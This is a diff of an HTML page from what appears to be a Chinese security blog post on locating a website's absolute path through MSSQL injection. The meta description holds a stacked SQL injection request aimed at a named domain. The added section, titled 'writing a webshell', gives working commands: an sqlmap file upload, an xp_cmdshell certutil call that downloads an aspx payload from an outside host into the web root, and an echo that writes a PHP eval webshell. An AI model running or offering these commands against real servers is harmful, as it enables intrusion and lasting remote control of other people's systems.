@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/05/06/EVPRwMjn7aNKd9G.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/06/jpgbihMvAz9KLPa.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/06/47AJntalbBFuHTL.png">
-<meta property="og:updated_time" content="2020-05-06T14:31:28.854Z">
+<meta property="og:updated_time" content="2020-05-06T14:34:19.071Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mssql 获取网站绝对路径的一个小技巧">
 <meta name="twitter:description" content="和同事学到的一个操作，记录一下。 步骤： 1 存在sql注入 创建表 GET /get.asp?act_id=52;create+table+gogotest+(tmp+varchar(1000));----&amp;amp;user_name=123 HTTP/1.1Host: 360gongfang.comConnection: closeCache-Control: max-age=0Upgrade">
@@ -114,6 +114,7 @@
 
 <p>验证：</p>
 <p><img src="https://i.loli.net/2020/05/06/47AJntalbBFuHTL.png" alt="图片.png"></p>
+<p><strong>3 写马</strong><br>sqlmap –random-agent –batch -r 1 –file-write 1.aspx –file-dest “xx\xx\aaa.aspx”<br>1;exec master..xp_cmdshell ‘certutil -urlcache -split -f <a href="http://x.x.x.x/aa.aspx" target="_blank" rel="noopener">http://x.x.x.x/aa.aspx</a> C:\phpstudy\www\aaa.aspx’;–<br>1;exec master..xp_cmdshell ‘echo ^&lt;?php @eval($_POST[x]);?^&gt; &gt; C:\phpstudy\www\shell.php’;–</p>
 
       
     </div>
